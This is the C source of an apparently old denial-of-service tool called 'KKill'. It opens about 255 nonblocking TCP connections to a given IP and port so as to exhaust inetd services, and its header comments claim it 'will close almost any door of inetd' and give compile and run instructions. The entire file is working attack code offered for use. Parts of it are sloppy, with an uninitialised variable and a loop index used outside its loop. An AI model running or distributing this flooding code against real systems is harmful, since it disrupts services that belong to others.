

/* By kbyte@rwx.ml.org / kbyte@biogate.com  */
/* Made in about 15 minutes . It will close almost any door of inetd */
/* Compile : cc -o kkill kkill.c and run kkill IP PORT */
/* Based on high level tcp functions for linux by jjohnson@eagle.ptialaska.net
 and presonic@undernet.irc */

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <errno.h>
#include <fcntl.h>

#define SOCKET_ERR      -1
#define CONNECT_ERR     -2
#define NONBLOCK_ERR    -3
#define LOOKUP_ERR      "ERROR"
#define TIMEOUT 60
#define BLOCKING        0
#define NONBLOCKING     1

int kk_count = 0;

int Connect(char *input,int port,int is_nonblock) {
        int sockfd, n;
        int sock_flags;
        struct sockaddr_in addr;

        addr.sin_port = htons(port);
        addr.sin_family = AF_INET;
        inet_aton(input,&addr.sin_addr);
        if((sockfd = socket(AF_INET,SOCK_STREAM,0)) < 0)
        return SOCKET_ERR;
        if(is_nonblock == NONBLOCKING) {
                if(fcntl(sockfd,F_GETFL,sock_flags) < 0)
                        return NONBLOCK_ERR;
                if(fcntl(sockfd,F_SETFL,sock_flags | O_NONBLOCK) < 0)
                        return NONBLOCK_ERR;
        }
        if(connect(sockfd,(struct sockaddr *) &addr, sizeof(addr)) < 0)
        {
        if(errno == EINPROGRESS) {
        return sockfd;  /* its non blocking socket */
        } else {
        return CONNECT_ERR;
        }}
        return sockfd;

}
kkill_main(int argc, char *argv[])
{
        int i, sockfd[256], maxsockfd=0, sockopt, n;
        int first = 0;
        char ip[30];
        fd_set wset;
        socklen_t socklen;
        struct timeval time;
 
        system("clear");
        printf("\n KKill by kbyte@rwx.ml.org \n");
        if(argc != 3)
        {
                printf("usage: %s ip port \n",argv[0]);
                exit(-1);
        }
        printf("\n Killing %s on port %s \n\n", argv[1], argv[2]);
        close(STDIN_FILENO);
        close(STDERR_FILENO);
        FD_ZERO(&wset);
        for(i=1 ; i != 256 ; ++i)
        {
                if((sockfd[i] = Connect(argv[1],atoi(argv[2]),1)) < 0)
                {
                printf("Failed calling connect() for sockfd[%d]!\n",i);
                continue;
                }
        }
        while(1)
        {
                for(i = 1 ; i != 256 ; ++i)
                {
if(getsockopt(sockfd[i],SOL_SOCKET,SO_ERROR,&sockopt,&socklen) == 0) {
                              FD_SET(sockfd[i], &wset);
                              if(sockfd[i] > maxsockfd) maxsockfd = sockfd[i];                }
                }
                time.tv_sec = TIMEOUT;
                if(sockopt==111) {
                if(first==0) printf("Port Closed. Try another one\n");
                if(first==1) printf("Bum! Port closed!!!\n");
                exit(0);
                }
                first = 1;
                if(select(maxsockfd + 1,NULL,&wset,NULL,&time) == 0)
                {
                        printf("Completed.\n");
                        exit(-1);
                }
                {
                        if(FD_ISSET(sockfd[i],&wset))
                        {
                        /* remove the sockfd from wset */
                        FD_CLR(sockfd[i],&wset);
                        socklen = 4;    /* sizeof(int) */
                        sockopt = -1;
               getsockopt(sockfd[i],SOL_SOCKET,SO_ERROR,&sockopt,&socklen);
        
                  close(sockfd[i]);
		  if(sockopt == ECONNREFUSED) 	{	
                  printf("Port Closed. Try another port\n");
                  exit(-1);
                  				}
                  if(sockopt == ENETUNREACH) {
                  printf("Host unreachable. Try later\n");
                  exit(-1);	 		}
                  if(sockopt == EHOSTUNREACH) {
                  printf("Host unreachable. Try later\n");
                  exit(-1);                     }
	
		}
		}
}
}

